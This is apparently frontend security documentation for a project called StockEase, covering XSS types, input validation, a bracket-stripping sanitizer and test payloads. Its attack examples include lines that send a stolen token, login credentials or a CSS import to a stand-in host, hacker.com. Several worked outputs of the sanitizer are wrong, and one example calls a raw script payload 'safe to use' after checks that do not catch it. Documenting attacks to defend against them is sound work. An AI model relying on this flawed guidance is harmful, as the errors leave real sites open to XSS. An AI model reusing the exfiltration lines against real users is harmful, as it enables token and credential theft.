# XSS Prevention & Input Sanitization

## Overview

Cross-Site Scripting (XSS) is one of the most dangerous web vulnerabilities. This document covers how StockEase Frontend prevents XSS attacks through input validation, sanitization, and secure coding practices.

---

## What is XSS (Cross-Site Scripting)?

### Types of XSS

**1. Stored XSS (Persistent)**
```javascript
// Attacker submits malicious input that gets stored
Product Name: <script>alert('hack')</script>

// Later, when other users view the product:
// Script executes in their browser
// Attacker steals token, credentials, or data
```

**2. Reflected XSS**
```javascript
// Attacker sends link with malicious payload
https://stockease.com/search?q=<img src=x onerror="stealToken()">

// User clicks link
// JavaScript executes in victim's browser
// Attacker gets access to victim's session
```

**3. DOM-based XSS**
```javascript
// Frontend JavaScript unsafely uses user input
const query = new URLSearchParams(window.location.search).get('q');
document.body.innerHTML = `Results for: ${query}`;

// If query = <img src=x onerror="alert('xss')">
// Script will execute
```

### Impact

- 🔓 Session hijacking (steal JWT token from localStorage)
- 🔓 Credential theft (fake login form)
- 🔓 Malware distribution
- 🔓 Data exfiltration
- 🔓 Account takeover

---

## Input Validation Rules

StockEase implements comprehensive input validation to prevent malicious data from entering the system.

### Validation Strategy

```typescript
// src/__tests__/utils/validation-rules/string-validation.test.ts

/**
 * Core validation rule:
 * All user input must be validated BEFORE use
 */

export const validateNonEmptyString = (
  value: unknown,
  fieldName: string = 'Field'
): { valid: boolean; error?: string } => {
  // Step 1: Type check
  if (typeof value !== 'string') {
    return { valid: false, error: `${fieldName} must be a string` };
  }

  // Step 2: Empty check
  if (value.trim().length === 0) {
    return { valid: false, error: `${fieldName} cannot be empty` };
  }

  // Step 3: Valid
  return { valid: true };
};
```

**Validation Flow:**
```
User Input
  ↓
Type Check (is it a string?)
  ├─ No → Reject (type error)
  └─ Yes → Continue
  ↓
Empty Check (has content?)
  ├─ No → Reject (empty error)
  └─ Yes → Continue
  ↓
Sanitization (remove harmful chars?)
  ↓
Database Insert / Display
```

### Input Rules by Field Type

#### Text Fields (Product Name, Description)

**Rules:**
- ✅ Must be string type
- ✅ Cannot be empty (after trim)
- ✅ Maximum length: 255 characters
- ✅ Remove `<` and `>` characters (XSS vectors)
- ✅ Trim whitespace

**Example:**
```typescript
const validateProductName = (name: string) => {
  const result = validateNonEmptyString(name, 'Product Name');
  if (!result.valid) return result;

  if (name.length > 255) {
    return { valid: false, error: 'Product Name too long (max 255 chars)' };
  }

  return { valid: true };
};

// Usage
const productName = userInput;  // "<script>alert('xss')</script>"

const validation = validateProductName(productName);
if (!validation.valid) {
  showError(validation.error);
  return;  // Don't proceed
}

// Now safe to use
createProduct({ name: productName });
```

#### Email Fields

**Rules:**
- ✅ Must be valid email format
- ✅ Cannot be empty
- ✅ Maximum length: 254 characters (RFC 5321)
- ✅ No HTML tags allowed

**Example:**
```typescript
const validateEmail = (email: string) => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  
  if (!emailRegex.test(email)) {
    return { valid: false, error: 'Invalid email format' };
  }
  
  return { valid: true };
};
```

#### Number Fields (Quantity, Price)

**Rules:**
- ✅ Must be number type
- ✅ Must be positive
- ✅ No special characters
- ✅ No script injection possible (parsed as number)

**Example:**
```typescript
const validateQuantity = (qty: unknown) => {
  if (typeof qty !== 'number' || qty <= 0) {
    return { valid: false, error: 'Quantity must be positive number' };
  }
  
  return { valid: true };
};
```

---

## Sanitization Implementation

### The sanitizeString Function

```typescript
// src/__tests__/utils/validation-rules/string-validation.test.ts

export const sanitizeString = (
  value: string,
  maxLength: number = 255
): string => {
  // Step 1: Type safety
  if (typeof value !== 'string') {
    return '';  // Return empty if not string
  }

  // Step 2: Trim whitespace
  let sanitized = value.trim().substring(0, maxLength);
  // "  hello world  " → "hello world"
  // " a".repeat(500) → "aaaaa..." (255 chars max)

  // Step 3: Remove XSS vectors
  sanitized = sanitized.replace(/[<>]/g, '');
  // "<script>alert('xss')</script>" → "script>alertxss/script>"

  return sanitized;
};
```

**What It Does:**

| Step | Input | Output | Purpose |
|------|-------|--------|---------|
| Trim | `"  hello  "` | `"hello"` | Remove leading/trailing spaces |
| Truncate | `"a".repeat(300)` | `"a".repeat(255)` | Prevent memory issues |
| Remove `<>` | `"<script>"` | `"script>"` | Prevent HTML tag injection |

**What It Doesn't Do:**

❌ **Does NOT fully sanitize HTML** — if you need to display HTML, use a proper library like DOMPurify
❌ **Does NOT handle all attack vectors** — focused on basic XSS prevention
❌ **Does NOT encrypt data** — only prevents script injection

### When to Sanitize

**Before Storing in Database:**
```typescript
// User input
const productName = userInput;  // "<img src=x onerror='hack'>"

// Validate
const validation = validateProductName(productName);
if (!validation.valid) return;

// Sanitize
const sanitized = sanitizeString(productName);
// Result: "img src=x onerror='hack'"

// Store
await createProduct({ name: sanitized });
```

**When Displaying User Content:**
```typescript
// Retrieve from database
const product = await getProduct(id);
const name = product.name;  // "img src=x onerror='hack'"

// Display safely
<div>{name}</div>
// React automatically escapes: "img src=x onerror='hack'"
// Browser displays as text, not executable HTML
```

---

## Dangerous Sinks (Where XSS Can Occur)

A "sink" is a place where user data is used in a way that could execute code. StockEase avoids these dangerous patterns.

### ❌ DANGEROUS: innerHTML

```typescript
// WRONG: User input directly into innerHTML
const userName = getUserInput();
document.getElementById('user').innerHTML = userName;
// If userName = "<img src=x onerror='stealToken()'>"
// Script will execute!
```

**Why it's dangerous:**
- innerHTML parses HTML and executes scripts
- `<img onerror>` will execute JavaScript
- `<iframe onload>` will execute JavaScript
- `<svg onload>` will execute JavaScript

### ✅ SAFE: React JSX (Auto-Escaping)

```typescript
// CORRECT: React automatically escapes
const userName = getUserInput();
return <div>{userName}</div>;
// Even if userName = "<img src=x onerror='hack'>"
// React renders it as text: "<img src=x onerror='hack'>"
// Browser displays text, doesn't execute
```

**Why it's safe:**
- React automatically escapes HTML entities
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- Scripts cannot execute
- Default behavior in all modern React versions

### ❌ DANGEROUS: dangerouslySetInnerHTML

```typescript
// WRONG (unless absolutely necessary)
const html = getUserInput();
<div dangerouslySetInnerHTML={{ __html: html }} />
// If html contains <script>, it will execute
```

**When to use it:**
- Very rare cases (parsing markdown, rich text editors)
- Must sanitize with DOMPurify first

**How to do it safely:**
```typescript
import DOMPurify from 'dompurify';

const html = getUserInput();
const cleanHtml = DOMPurify.sanitize(html);
<div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
// DOMPurify removes dangerous tags
// Safe to display
```

### ❌ DANGEROUS: eval()

```typescript
// NEVER DO THIS
const userCode = getUserInput();
eval(userCode);  // 💀 TERRIBLE IDEA
// User can execute ANY JavaScript
```

**Why it's dangerous:**
- Allows arbitrary code execution
- No way to limit what code can do
- Complete system compromise

### ✅ SAFE: Attributes and Text Content

```typescript
// Safe: User input in text content
<p>Hello {userName}</p>  // Escaped automatically

// Safe: User input in attributes (with validation)
<input value={productName} />  // Escaped automatically

// Safe: User input in data attributes
<div data-id={productId}>{productName}</div>  // Escaped

// NOT safe: User input in event handlers
<button onClick={() => executeUserCode()} />  // Bad!
```

---

## Real-World Attack Scenarios

### Scenario 1: Product Name Injection

```javascript
// Attacker submits product:
Product Name: <img src=x onerror="fetch('https://hacker.com/token?t=' + localStorage.getItem('token'))">

// Without sanitization:
// Token sent to hacker's server
// Account compromised

// With validation + sanitization:
// Input rejected if XSS detected
// Or dangerous chars removed
// Data stored safely
```

### Scenario 2: localStorage XSS Vulnerability

```javascript
// Even if input is sanitized, localStorage is vulnerable
// Because anyone with JavaScript access can read it

// Attacker injects script via XSS in other part of app
var token = localStorage.getItem('token');
fetch('https://hacker.com/steal?token=' + token);
// Token stolen!

// Defense:
// 1. Prevent XSS (strict input validation)
// 2. Use HttpOnly cookies (not accessible to JavaScript)
// 3. Short token lifetime (refresh tokens)
```

### Scenario 3: Fake Login Form Injection

```html
<!-- Attacker injects fake login form via XSS -->
<div style="position: fixed; top: 0; width: 100%; height: 100%; background: white; z-index: 9999;">
  <h1>Session Expired - Please Login Again</h1>
  <form action="https://hacker.com/steal">
    <input name="email" placeholder="Email">
    <input name="password" placeholder="Password" type="password">
    <button type="submit">Login</button>
  </form>
</div>

<!-- User thinks they need to login -->
<!-- Actually submitting credentials to attacker -->
```

**Defense:**
- Prevent XSS injection (input validation)
- CSP (Content Security Policy) prevents external scripts
- HTTPS prevents man-in-the-middle

---

## Best Practices

### ✅ DO:

- ✅ Validate ALL user input (empty, type, length, format)
- ✅ Sanitize before storing in database
- ✅ Use React JSX (auto-escaping)
- ✅ Display user content safely (as text, not HTML)
- ✅ Use Content Security Policy (CSP)
- ✅ Keep dependencies updated
- ✅ Use form validation libraries
- ✅ Implement CSP headers
- ✅ Test with XSS payloads

### ❌ DON'T:

- ❌ Use innerHTML with user data
- ❌ Use eval() with any input
- ❌ Trust client-side validation only
- ❌ Render user HTML without DOMPurify
- ❌ Log user input to console (contains data)
- ❌ Store unvalidated data
- ❌ Skip backend validation (client can be bypassed)
- ❌ Use dangerouslySetInnerHTML without sanitization

---

## Testing for XSS

### XSS Payload Test Cases

```typescript
describe('XSS Prevention', () => {
  // Test 1: Basic script tag
  it('should prevent <script> injection', () => {
    const payload = '<script>alert("xss")</script>';
    const sanitized = sanitizeString(payload);
    expect(sanitized).not.toContain('<');
    expect(sanitized).not.toContain('>');
  });

  // Test 2: Event handler
  it('should prevent event handler injection', () => {
    const payload = '<img src=x onerror="alert(\'xss\')">';
    const sanitized = sanitizeString(payload);
    expect(sanitized).not.toContain('<');
    expect(sanitized).not.toContain('>');
  });

  // Test 3: SVG injection
  it('should prevent SVG injection', () => {
    const payload = '<svg onload="alert(\'xss\')">';
    const sanitized = sanitizeString(payload);
    expect(sanitized).not.toContain('<');
    expect(sanitized).not.toContain('>');
  });

  // Test 4: Safe content preserved
  it('should preserve safe content', () => {
    const safe = 'Hello, World! 123-test_underscore';
    const sanitized = sanitizeString(safe);
    expect(sanitized).toContain('Hello');
    expect(sanitized).toContain('World');
    expect(sanitized).toContain('123');
    expect(sanitized).toContain('-');
    expect(sanitized).toContain('_');
  });
});
```

### Manual Testing

```bash
# Test in browser console
# Try submitting these payloads to form fields

# Basic script
<script>alert('xss')</script>

# Event handler
<img src=x onerror="alert('xss')">

# SVG
<svg onload="alert('xss')">

# Iframe
<iframe src="javascript:alert('xss')">

# Style
<style>@import 'https://hacker.com/steal'</style>

# Expected behavior:
# - Input rejected OR
# - Dangerous chars removed OR
# - Displayed as text (not executed)
```

---

## Related Files

- **String Validation Tests:** `src/__tests__/utils/validation-rules/string-validation.test.ts`
- **API Client:** `src/services/apiClient.ts`
- **Auth Service:** `src/api/auth.ts`
- **Login Page:** `src/pages/LoginPage.tsx`
- **Error Boundary:** `src/components/ErrorBoundary.tsx`
- **CSP Policy:** See [CSP Documentation](./csp.md)

---

**Last Updated:** November 13, 2025  
**Status:** Production-Ready  
**OWASP Reference:** [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
